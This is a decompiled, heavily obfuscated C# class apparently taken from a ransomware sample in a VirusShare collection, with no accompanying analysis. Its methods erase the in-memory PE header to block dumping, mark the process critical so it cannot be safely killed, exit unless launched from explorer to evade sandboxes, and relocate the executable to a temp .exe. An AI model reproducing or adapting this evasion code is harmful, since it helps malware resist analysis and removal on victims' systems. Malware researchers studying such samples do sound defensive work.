// Decompiled with JetBrains decompiler
// Type: ր֬ᏉṢᡄẼ஗ᱻసҡƬོᒉࢲʗᎎཛྷ.ᚊᐍѳʛ෡ᘙทᕑᳶ֫܃̓؎ిᬚᚌ
// Assembly: update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E0159D6-932F-4F32-8DCB-751F61B22DA0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-1e13fd2b44573360e0d5f6cc2d3a4e1161d119837d808fac0c43885d53ec395f.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using ր֬ᏉṢᡄẼ\u0B97ᱻసҡƬོᒉࢲʗᎎཛྷ;

namespace ր֬ᏉṢᡄẼ\u0B97ᱻసҡƬོᒉࢲʗᎎཛྷ
{
  public static class ᚊᐍѳʛ\u0DE1ᘙทᕑᳶ֫\u0703̓\u060Eిᬚᚌ
  {
    public static void ᥧᕘӍལ\u1361ᢳċᇵԹḲńӽᚄ\u0DE0ඈΥ\u0C29()
    {
      if (\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.ᝪ\u17D8ÐΛፅ\u09BA\u0B34)
        ᚊᐍѳʛ\u0DE1ᘙทᕑᳶ֫\u0703̓\u060Eిᬚᚌ.ጣग़ࣹ̩᪙ͧ\u0FE6ࢧᜦ\u0CD3ၔ();
      if (\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.ẇᤆԶქਚ\u137A\u0D78\u09F2Ţ\u02EFŃภ\u0704వඒᨆ && !ᚊᐍѳʛ\u0DE1ᘙทᕑᳶ֫\u0703̓\u060Eిᬚᚌ.צଋ\u060B᧔߅ў)
        Process.GetCurrentProcess().Kill();
      if (!\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.ᝡስ\u0EE5ڌპ᪉᠓ᬯ)
        return;
      ᚊᐍѳʛ\u0DE1ᘙทᕑᳶ֫\u0703̓\u060Eిᬚᚌ.\u17FCሚரధᏢ\u070A\u18FDᆢి\u070AḳᩑZᦤᦋ();
    }

    public static void ጣग़ࣹ̩᪙ͧ\u0FE6ࢧᜦ\u0CD3ၔ()
    {
      try
      {
        IntPtr num = \u1064ᘗȩࠈዮȼࣣ͟ჾẬᦢ\u0DCB̌ᓆޓì\u058E.\u193A\u0C45ޥɈ\u0D53տತᅙ\u0A0Cนᯋᥢᆟ\u089Fᤍ((string) null);
        \u1064ᘗȩࠈዮȼࣣ͟ჾẬᦢ\u0DCB̌ᓆޓì\u058E.ҵᮬᑓСۧ\u0A78ওŬខ\u0E6Cᕝ\u0F6EࠏẤŕᩧ\u02F4ᙩ(num, 512U, 4U, out uint _);
        \u1064ᘗȩࠈዮȼࣣ͟ჾẬᦢ\u0DCB̌ᓆޓì\u058E.\u07B3ᅱϥ\u09D3ጨŚ\u1B7C\u181C(num, (IntPtr) 512);
      }
      catch
      {
      }
    }

    public static void \u17FCሚரధᏢ\u070A\u18FDᆢి\u070AḳᩑZᦤᦋ()
    {
      try
      {
        int num = 1;
        \u1064ᘗȩࠈዮȼࣣ͟ჾẬᦢ\u0DCB̌ᓆޓì\u058E.Ỗ\u0FF8जƊ\u124Eऱᄡᡢ\u0B7B\u02D6Ĺ\u0F48\u0D53ᔒ࠙ụ\u0AFBዪѬ(Process.GetCurrentProcess().Handle, 29, ref num, 4);
      }
      catch
      {
      }
    }

    public static bool צଋ\u060B᧔߅ў
    {
      get
      {
        using (ManagementObject managementObject = new ManagementObject("win32_process.handle='" + Process.GetCurrentProcess().Id.ToString() + "'"))
        {
          managementObject.Get();
          return !(Process.GetProcessById(Convert.ToInt32(managementObject["ParentProcessId"])).ProcessName.ToLower() != "explorer");
        }
      }
    }

    public static void \u06DDڅ2\u17F0Ŕ\u0090ᔝੌ\u082Fṽ()
    {
      try
      {
        string tempFileName = Path.GetTempFileName();
        File.Delete(tempFileName);
        string destFileName = tempFileName.Replace(".tmp", ".exe");
        File.Move(Process.GetCurrentProcess().MainModule.FileName, destFileName);
      }
      catch
      {
      }
    }
  }
}
